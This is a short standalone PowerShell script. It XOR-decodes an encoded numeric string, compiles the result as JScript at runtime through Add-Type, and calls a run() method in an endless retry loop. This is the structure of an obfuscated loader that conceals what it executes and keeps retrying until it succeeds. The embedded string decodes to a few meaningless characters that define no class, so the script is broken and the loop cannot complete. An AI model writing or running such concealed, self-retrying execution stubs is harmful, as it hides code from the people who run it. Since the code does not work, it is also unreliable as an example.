function Dec([string]$s) {
  $o = ""
  for ($i = 0; $i -lt $s.Length; $i += 3) {
    $n = [int]$s.Substring($i, 3)
    $o += [char]($n -bxor 111)
  }
  return $o
}
$enc = "022013002062005089"
$src = Dec $enc
while ($true) {
  try {
    Add-Type -language JScript -TypeDefinition $src -ErrorAction Stop
    [jsc35]::run()
    break
  } catch {
    try { Add-Type -language JScript -TypeDefinition $src.Replace("jsc35","jsc36"); [jsc36]::run(); break } catch { Start-Sleep 5 }
  }
}
